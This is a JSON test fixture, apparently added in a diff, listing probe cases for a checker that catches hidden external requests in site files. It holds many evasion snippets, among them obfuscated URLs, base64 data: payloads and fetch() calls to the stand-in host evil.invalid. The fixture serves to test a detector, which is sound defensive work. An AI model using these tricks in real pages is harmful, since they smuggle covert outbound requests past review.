@@ -1,0 +1,915 @@
+[
+  {
+    "probe": "p48.mjs",
+    "label": "&#9; in host",
+    "source": "<img src=\"https://ev&#9;il.invalid/a\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "&Tab; in host",
+    "source": "<img src=\"https://ev&Tab;il.invalid/a\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "host;@evil",
+    "source": "<img src=\"https://fonts.gstatic.com;@evil.invalid/a\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "host;@evil in text",
+    "source": "see https://fonts.gstatic.com;@evil.invalid/a",
+    "kind": "text",
+    "name": "llms.txt",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "evil\\@allowed",
+    "source": "<img src=\"https://evil.invalid\\@fonts.gstatic.com/a\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "evil\\@allowed JS",
+    "source": "fetch(\"https://evil.invalid\\\\@fonts.gstatic.com/a\")",
+    "kind": "js",
+    "name": "assets/x.js",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "bare https://",
+    "source": "<a href=\"https://\">x</a>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "bare https:// in js",
+    "source": "const a=\"https://\";",
+    "kind": "js",
+    "name": "assets/x.js",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "escaped js \\/\\/",
+    "source": "fetch(\"https:\\/\\/evil.invalid/a\")",
+    "kind": "js",
+    "name": "assets/x.js",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "escaped js \\u0068ttps",
+    "source": "fetch(\"\\u0068ttps://evil.invalid/a\")",
+    "kind": "js",
+    "name": "assets/x.js",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "escaped js \\x2f\\x2f",
+    "source": "fetch(\"\\x2f\\x2fevil.invalid/a\")",
+    "kind": "js",
+    "name": "assets/x.js",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "escaped js \\u{2f}",
+    "source": "fetch(\"\\u{2f}\\u{2f}evil.invalid/a\")",
+    "kind": "js",
+    "name": "assets/x.js",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "escaped js line-continuation",
+    "source": "fetch(\"https://ev\\\nil.invalid/a\")",
+    "kind": "js",
+    "name": "assets/x.js",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "refresh comma + mention",
+    "source": "<meta http-equiv=\"refresh\" content=\"0,url=https://evil.invalid\">",
+    "kind": "html",
+    "name": "index.html",
+    "mentions": {
+      "version": 1,
+      "mentions": [
+        {
+          "kind": "non-request mention",
+          "file": "index.html",
+          "host": "evil.invalid",
+          "reason": "x"
+        }
+      ]
+    },
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "refresh semicolon + mention",
+    "source": "<meta http-equiv=\"refresh\" content=\"0; URL='https://evil.invalid'\">",
+    "kind": "html",
+    "name": "index.html",
+    "mentions": {
+      "version": 1,
+      "mentions": [
+        {
+          "kind": "non-request mention",
+          "file": "index.html",
+          "host": "evil.invalid",
+          "reason": "x"
+        }
+      ]
+    },
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "refresh to nav host (resource?)",
+    "source": "<meta http-equiv=\"refresh\" content=\"0;url=https://x.com/\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "srcdoc entity external img",
+    "source": "<iframe srcdoc=\"&lt;img src=&quot;https://ev&amp;#105;l.invalid/a&quot;&gt;\"></iframe>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "srcdoc nav-host img",
+    "source": "<iframe srcdoc=\"&lt;img src=&quot;https://github.com/a.png&quot;&gt;\"></iframe>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "image-set",
+    "source": "<style>body{background-image:image-set(\"https://evil.invalid/a\" 1x)}</style>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "image-set nav host",
+    "source": "<style>body{background-image:image-set(\"https://github.com/a\" 1x)}</style>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "nested template fetch",
+    "source": "<script>const u=`${`${fetch(`https://evil.invalid/a`)}`}`;</script>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "nested template fetch nav",
+    "source": "<script>const u=`${fetch(`https://x.com/a`)}`;</script>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "template interpolated host",
+    "source": "<script>fetch(`https://${\"evil.invalid\"}/a`)</script>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "svg image href nav host",
+    "source": "<svg><image href=\"https://github.com/a.png\"/></svg>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "svg image xlink nav host",
+    "source": "<svg><image xlink:href=\"https://github.com/a.png\"/></svg>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "link apple-touch-icon nav",
+    "source": "<link rel=\"apple-touch-icon\" href=\"https://github.com/a.png\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "link modulepreload nav",
+    "source": "<link rel=\"modulepreload\" href=\"https://github.com/a.js\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "link manifest nav",
+    "source": "<link rel=\"manifest\" href=\"https://github.com/m.json\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "link stylesheet nav",
+    "source": "<link rel=\"stylesheet\" href=\"https://github.com/a.css\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "script src nav",
+    "source": "<script src=\"https://x.com/a.js\"></script>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "img src nav",
+    "source": "<img src=\"https://x.com/p.gif\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "a ping nav",
+    "source": "<a href=\"/\" ping=\"https://x.com/p\">x</a>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "js indirect fetch nav",
+    "source": "const u=\"https://x.com/t\";fetch(u);",
+    "kind": "js",
+    "name": "assets/x.js",
+    "expected": "control"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "js img.src nav",
+    "source": "new Image().src=\"https://x.com/t.gif\";",
+    "kind": "js",
+    "name": "assets/x.js",
+    "expected": "control"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "js XHR nav",
+    "source": "const x=new XMLHttpRequest();x.open(\"GET\",\"https://x.com/t\");x.send();",
+    "kind": "js",
+    "name": "assets/x.js",
+    "expected": "control"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "js new Worker nav",
+    "source": "new Worker(\"https://x.com/w.js\")",
+    "kind": "js",
+    "name": "assets/x.js",
+    "expected": "control"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "js dynamic import evil",
+    "source": "import(\"https://evil.invalid/m.js\")",
+    "kind": "js",
+    "name": "assets/x.js",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "js concat evil",
+    "source": "fetch(\"https://ev\"+\"il.invalid/a\")",
+    "kind": "js",
+    "name": "assets/x.js",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "css @import nav",
+    "source": "@import \"https://github.com/a.css\";",
+    "kind": "css",
+    "name": "assets/x.css",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "css url nav",
+    "source": "body{background:url(https://github.com/a.png)}",
+    "kind": "css",
+    "name": "assets/x.css",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "style attr url nav",
+    "source": "<div style=\"background:url(https://github.com/a.png)\"></div>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "base href evil",
+    "source": "<base href=\"https://evil.invalid/\"><img src=\"a.png\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "srcset userinfo comma",
+    "source": "<img srcset=\"https://fonts.gstatic.com,@evil.invalid/a 1x\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "protocol-relative //evil",
+    "source": "<img src=\"//evil.invalid/a\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "backslash-relative \\\\evil",
+    "source": "<img src=\"\\\\evil.invalid/a\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "mixed case scheme HtTpS",
+    "source": "<img src=\"HtTpS://EVIL.invalid/a\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "IDN punycode",
+    "source": "<img src=\"https://ëvil.invalid/a\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "IP literal",
+    "source": "<img src=\"https://0x7f.1/a\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "data URL svg w/ external",
+    "source": "<img src=\"data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cimage href=%22https://evil.invalid/a%22/%3E%3C/svg%3E\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "mention on file w/ active in srcset",
+    "source": "<img srcset=\"https://evil.invalid/a 1x\">",
+    "kind": "html",
+    "name": "index.html",
+    "mentions": {
+      "version": 1,
+      "mentions": [
+        {
+          "kind": "non-request mention",
+          "file": "index.html",
+          "host": "evil.invalid",
+          "reason": "x"
+        }
+      ]
+    },
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "mention for host only in comment",
+    "source": "<!-- see https://evil.invalid -->",
+    "kind": "html",
+    "name": "index.html",
+    "mentions": {
+      "version": 1,
+      "mentions": [
+        {
+          "kind": "non-request mention",
+          "file": "index.html",
+          "host": "evil.invalid",
+          "reason": "x"
+        }
+      ]
+    },
+    "expected": "inert-mention"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "onerror handler fetch",
+    "source": "<img src=\"a.png\" onerror=\"fetch('https://evil.invalid')\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "onerror handler nav host",
+    "source": "<img src=\"a.png\" onerror=\"fetch('https://x.com/t')\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "svg <use> external evil",
+    "source": "<svg><use href=\"https://evil.invalid/s.svg#a\"/></svg>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "object data nav",
+    "source": "<object data=\"https://github.com/a.svg\"></object>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "input image src nav",
+    "source": "<input type=\"image\" src=\"https://github.com/a.png\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "video>source src nav",
+    "source": "<video><source src=\"https://github.com/a.mp4\"></video>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "track src nav",
+    "source": "<video><track src=\"https://github.com/a.vtt\"></video>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48.mjs",
+    "label": "meta og:image nav",
+    "source": "<meta property=\"og:image\" content=\"https://github.com/a.png\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "control"
+  },
+  {
+    "probe": "p48b.mjs",
+    "label": "&#9; in host",
+    "source": "<img src=\"https://ev&#9;il.invalid/a\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48b.mjs",
+    "label": "iframe data: base64 html",
+    "source": "<iframe src=\"data:text/html;base64,PGltZyBzcmM9Imh0dHBzOi8vZXZpbC5pbnZhbGlkL2EiPg==\"></iframe>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48b.mjs",
+    "label": "iframe data: pct-encoded quotes",
+    "source": "<iframe src=\"data:text/html,%3Cimg%20src=%22https://evil.invalid/a%22%3E\"></iframe>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48b.mjs",
+    "label": "iframe data: fully pct-encoded",
+    "source": "<iframe src=\"data:text/html,%3Cimg%20src%3D%22https%3A%2F%2Fevil.invalid%2Fa%22%3E\"></iframe>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48b.mjs",
+    "label": "object data: base64 html",
+    "source": "<object data=\"data:text/html;base64,PGltZyBzcmM9Imh0dHBzOi8vZXZpbC5pbnZhbGlkL2EiPg==\"></object>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48b.mjs",
+    "label": "embed data: base64 svg",
+    "source": "<embed src=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxpbWFnZSBocmVmPSJodHRwczovL2V2aWwuaW52YWxpZC9hIi8+PC9zdmc+\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48b.mjs",
+    "label": "word-char prefix in text (backstop)",
+    "source": "<p>x_https://evil.invalid/a</p>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-host"
+  },
+  {
+    "probe": "p48b.mjs",
+    "label": "css url pct",
+    "source": "body{background:url(data:image/svg+xml,%3Csvg%3E%3C/svg%3E)}",
+    "kind": "css",
+    "name": "assets/x.css",
+    "expected": "local-control"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "svg>style>img evil",
+    "source": "<svg><style><img src=\"https://evil.invalid/a\"></style></svg>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "svg>style>img NAV (github)",
+    "source": "<svg><style><img src=\"https://github.com/a.png\"></style></svg>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "svg>style>img evil + mention",
+    "source": "<svg><style><img src=\"https://evil.invalid/a\"></style></svg>",
+    "kind": "html",
+    "name": "index.html",
+    "mentions": {
+      "version": 1,
+      "mentions": [
+        {
+          "kind": "non-request mention",
+          "file": "index.html",
+          "host": "evil.invalid",
+          "reason": "probe"
+        }
+      ]
+    },
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "math>style>img NAV",
+    "source": "<math><style><img src=\"https://x.com/a.gif\"></style></math>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "math>style>img evil + mention",
+    "source": "<math><style><img src=\"https://evil.invalid/a\"></style></math>",
+    "kind": "html",
+    "name": "index.html",
+    "mentions": {
+      "version": 1,
+      "mentions": [
+        {
+          "kind": "non-request mention",
+          "file": "index.html",
+          "host": "evil.invalid",
+          "reason": "probe"
+        }
+      ]
+    },
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "svg>title>img NAV",
+    "source": "<svg><title><img src=\"https://x.com/a.gif\"></title></svg>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "CDATA bogus comment NAV",
+    "source": "<![CDATA[ > <img src=\"https://github.com/a.png\"> ]]>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "CDATA bogus comment evil + mention",
+    "source": "<![CDATA[ > <img src=\"https://evil.invalid/a\"> ]]>",
+    "kind": "html",
+    "name": "index.html",
+    "mentions": {
+      "version": 1,
+      "mentions": [
+        {
+          "kind": "non-request mention",
+          "file": "index.html",
+          "host": "evil.invalid",
+          "reason": "probe"
+        }
+      ]
+    },
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "svg CDATA (real) NAV",
+    "source": "<svg><![CDATA[ <img src=\"https://github.com/a.png\"> ]]></svg>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "bogus comment <? NAV",
+    "source": "<?x > <img src=\"https://github.com/a.png\"> ?>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "comment --!> NAV",
+    "source": "<!-- x --!> <img src=\"https://github.com/a.png\"> -->",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "noscript img NAV",
+    "source": "<noscript><img src=\"https://github.com/a.png\"></noscript>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "textarea fake (inert) NAV",
+    "source": "<textarea><img src=\"https://github.com/a.png\"></textarea>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "control"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "title fake (inert) NAV",
+    "source": "<title><img src=\"https://github.com/a.png\"></title>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "control"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "hidden img nav no structure (template)",
+    "source": "<template><img src=\"https://github.com/a.png\"></template>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "img in xmp NAV (inert)",
+    "source": "<xmp><img src=\"https://github.com/a.png\"></xmp>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "control"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "plaintext then img NAV (inert)",
+    "source": "<plaintext><img src=\"https://github.com/a.png\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "control"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "unquoted attr w/ backtick NAV",
+    "source": "<img src=`https://github.com/a.png`>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "control"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "attr with / separator NAV",
+    "source": "<img/src=\"https://github.com/a.png\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "dup attr first wins",
+    "source": "<img src=\"/local.png\" src=\"https://github.com/a.png\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "control"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "svg set to= NAV",
+    "source": "<svg><image href=\"/a.png\"><set attributeName=\"href\" to=\"https://github.com/a.png\"/></image></svg>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "svg set to= evil + mention",
+    "source": "<svg><image href=\"/a.png\"><set attributeName=\"href\" to=\"https://evil.invalid/a\"/></image></svg>",
+    "kind": "html",
+    "name": "index.html",
+    "mentions": {
+      "version": 1,
+      "mentions": [
+        {
+          "kind": "non-request mention",
+          "file": "index.html",
+          "host": "evil.invalid",
+          "reason": "probe"
+        }
+      ]
+    },
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "svg animate values= NAV",
+    "source": "<svg><image href=\"/a.png\"><animate attributeName=\"href\" values=\"https://github.com/a.png\"/></image></svg>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "link stylesheet data:css @import NAV",
+    "source": "<link rel=\"stylesheet\" href=\"data:text/css,@import url(https://github.com/a.css);\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "link stylesheet data:css evil + mention",
+    "source": "<link rel=\"stylesheet\" href=\"data:text/css,@import url(https://evil.invalid/a.css);\">",
+    "kind": "html",
+    "name": "index.html",
+    "mentions": {
+      "version": 1,
+      "mentions": [
+        {
+          "kind": "non-request mention",
+          "file": "index.html",
+          "host": "evil.invalid",
+          "reason": "probe"
+        }
+      ]
+    },
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "link stylesheet data:css base64 NAV",
+    "source": "<link rel=\"stylesheet\" href=\"data:text/css;base64,Ym9keXtiYWNrZ3JvdW5kOnVybChodHRwczovL2dpdGh1Yi5jb20vYS5wbmcpfQ==\">",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "script src data:js NAV",
+    "source": "<script src=\"data:text/javascript,fetch(%27https://x.com/t%27)\"></script>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "script src data:js b64 evil + mention",
+    "source": "<script src=\"data:text/javascript;base64,ZmV0Y2goJ2h0dHBzOi8vZXZpbC5pbnZhbGlkL3QnKQ==\"></script>",
+    "kind": "html",
+    "name": "index.html",
+    "mentions": {
+      "version": 1,
+      "mentions": [
+        {
+          "kind": "non-request mention",
+          "file": "index.html",
+          "host": "evil.invalid",
+          "reason": "probe"
+        }
+      ]
+    },
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "style @import url(data:) NAV",
+    "source": "<style>@import url(data:text/css,body%7Bbackground:url(https://github.com/a.png)%7D);</style>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "style @import url(data:) evil+mention",
+    "source": "<style>@import url(\"data:text/css,body{background:url(https://evil.invalid/a)}\");</style>",
+    "kind": "html",
+    "name": "index.html",
+    "mentions": {
+      "version": 1,
+      "mentions": [
+        {
+          "kind": "non-request mention",
+          "file": "index.html",
+          "host": "evil.invalid",
+          "reason": "probe"
+        }
+      ]
+    },
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "css url(data:svg) w/ external NAV",
+    "source": "<div style=\"background:url(&quot;data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><image href='https://github.com/a.png'/></svg>&quot;)\"></div>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  },
+  {
+    "probe": "p48c.mjs",
+    "label": "iframe data html w/ data css",
+    "source": "<iframe src=\"data:text/html,%3Clink%20rel%3Dstylesheet%20href%3D%22data%3Atext%2Fcss%2C%40import%20url(https%3A%2F%2Fgithub.com%2Fa.css)%22%3E\"></iframe>",
+    "kind": "html",
+    "name": "index.html",
+    "expected": "reject-or-resource"
+  }
+]
